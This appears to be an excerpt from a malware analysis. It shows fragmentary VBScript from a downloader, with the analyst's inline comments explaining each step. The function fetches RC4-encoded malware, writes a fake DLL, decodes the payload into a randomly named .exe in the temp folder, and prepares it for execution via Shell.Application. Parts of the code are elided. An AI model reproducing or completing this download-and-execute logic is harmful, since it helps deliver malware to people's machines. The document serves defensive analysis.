...
Sub fire()       /* fire () does the following: Downloads RC4 encoded malware from the URL specified in req.Send. */
      ...
      req.Option(0)=uas
      req.Send
      If 200=req.status Then        /* If req.status is 200 (success), create fakedll */
        z=req.responseBody
        ...
        b.Write dlltxt
        b.Close
        f=c.BuildPath(tmp,rnds(8)&".exe")                 /* decodes the downloaded malware in arcnsave () and generates [random 8 characters] .exe under% tmp% */
        ...
        stream.Close
        /* Preparing for the execution by making [random 8 characters] .exe under% tmp%.
        Sets the environment variable and loads CreateObject("Shell.Application")the dll was created in. */
